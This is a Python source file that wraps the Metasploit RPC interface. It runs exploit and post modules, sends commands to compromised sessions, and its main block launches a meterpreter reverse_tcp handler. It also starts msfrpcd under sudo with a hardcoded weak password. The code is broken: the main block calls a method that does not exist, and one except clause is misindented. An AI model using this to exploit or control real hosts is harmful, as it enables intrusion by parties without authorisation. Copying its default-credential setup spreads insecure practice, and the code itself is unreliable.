import subprocess
import time
from pymetasploit3.msfrpc import MsfRpcClient
from threading import Lock

class MetasploitClient:
    def __init__(self):
        self.client = None
        self.lock = Lock()
        self.connected = False

    def start_msfrpcd(self):
        """Start the Metasploit RPC daemon if not running"""
        try:
            # Check if msfrpcd is already running
            check_cmd = "ps aux | grep msfrpcd | grep -v grep"
            result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
            
            if not result.stdout.strip():
                # Start msfrpcd with default password
                subprocess.run(["sudo", "msfrpcd", "-P", "abc123", "-S"], check=True)
                time.sleep(5)  # Wait for daemon to start
            return True
        except subprocess.CalledProcessError as e:
            print(f"Error starting msfrpcd: {str(e)}")
            return False
    
    def connect(self):
        """Connect to the Metasploit RPC server"""
        if not self.connected:
            try:
                if self.start_msfrpcd():
                    self.client = MsfRpcClient('abc123')
                    self.connected = True
                    return True
            except Exception as e:
                print(f"Error connecting to Metasploit RPC: {str(e)}")
                return False
        return True

    def get_module_list(self, module_type):
        """Get list of available modules of specified type"""
        if not self.connect():
            return []
            
        with self.lock:
            try:
                if module_type == "exploit":
                    return self.client.modules.exploits
                elif module_type == "auxiliary":
                    return self.client.modules.auxiliary
                elif module_type == "post":
                    return self.client.modules.post
                elif module_type == "payload":
                    return self.client.modules.payloads
                return []
            except Exception as e:
                print(f"Error getting module list: {str(e)}")
                return []

    def get_module_info(self, module_type, module_name):
        """Get detailed information about a specific module"""
        if not self.connect():
            return None
            
        with self.lock:
            try:
                if module_type == "exploit":
                    return self.client.modules.use('exploit', module_name)
                elif module_type == "auxiliary":
                    return self.client.modules.use('auxiliary', module_name)
                elif module_type == "post":
                    return self.client.modules.use('post', module_name)
                elif module_type == "payload":
                    return self.client.modules.use('payload', module_name)
                return None
            except Exception as e:
                print(f"Error getting module info: {str(e)}")
                return None

    def execute_module(self, module_type, module_name, options):
        """Execute a Metasploit module with specified options"""
        if not self.connect():
            return False, "Failed to connect to Metasploit RPC"
            
        with self.lock:
            try:
                module = self.client.modules.use(module_type, module_name)
                
                # Set module options
                for key, value in options.items():
                    module[key] = value
                
                # Execute the module
                if module_type == "exploit":
                    result = module.execute()
                else:
                    result = module.run()
                
                return True, result
            except Exception as e:
                return False, f"Error executing module: {str(e)}"

    def get_sessions(self):
        """Get list of active sessions"""
        if not self.connect():
            return []
            
        with self.lock:
            try:
                return self.client.sessions.list
            except Exception as e:
                print(f"Error getting sessions: {str(e)}")
                return []

    def interact_with_session(self, session_id, command):
        """Send command to an active session"""
        if not self.connect():
            return False, "Failed to connect to Metasploit RPC"
            
        with self.lock:
            try:
                session = self.client.sessions.session(session_id)
                result = session.run_with_output(command)
                return True, result
        except Exception as e:
                return False, f"Error interacting with session: {str(e)}"

    def close(self):
        """Close the Metasploit RPC connection"""
        if self.client:
            try:
                self.client.logout()
            except:
                pass
            self.client = None
            self.connected = False

if __name__ == "__main__":
    msf = MetasploitClient()
    if msf.connect():
        result = msf.run_exploit(
            target="192.168.1.100",
            exploit="exploit/multi/handler",
            payload="payload/python/meterpreter/reverse_tcp",
            options={'LHOST': '192.168.1.1', 'LPORT': '4444'}
        )
        print(result)
